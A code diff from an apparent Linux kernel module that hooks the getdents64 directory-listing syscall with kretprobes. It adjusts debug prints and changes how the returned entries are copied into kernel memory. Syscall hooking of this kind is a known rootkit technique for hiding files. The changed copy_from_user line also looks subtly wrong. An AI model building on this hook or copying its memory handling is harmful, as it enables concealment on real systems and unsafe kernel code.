@@ -60,9 +60,6 @@ static struct getdents_data{
 
 
 static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
-	printk(KERN_INFO "Executing __x64_sys_getdents64_pre_handler... ");
-
-
 	struct getdents_data *dentry_data=(struct getdents_data *)ri->data;
 
 
@@ -75,12 +72,12 @@ static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, str
 
 static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 
+	printk(KERN_INFO "executing __x64_sys_getdents64_post_handler");
 	struct linux_dirent64 __user *dentry_data=(struct linux_dirent64 *)regs->si;
 
 	struct linux_dirent64 *current_dir,*dirent_ker=NULL;
 	unsigned long offset = 0;
 
-	printk(KERN_INFO "LOLOL: %s",dentry_data->d_name);
 
 	ssize_t ret = regs_return_value(regs);
 	printk(KERN_INFO "getdents returned %d bytes", ret);
@@ -98,14 +95,7 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 		return ret;
 
 
-	if(!access_ok(dentry_data, ret)){
-		printk(KERN_ERR "access_ok failed on user pointer %px", dentry_data);
-	}else {
-		int copied=copy_from_user(kbuf,dentry_data,ret);
-	}
-
-
-	long error = copy_from_user(kbuf,dentry_data,ret);
+	long error = copy_from_user(kbuf,dentry_data->d_name,ret);
 	if(error){
 		printk(KERN_ERR "could not copy %ld bytes from user",ret);
 		printk(KERN_ERR "copy_from_user error: %ld",error);
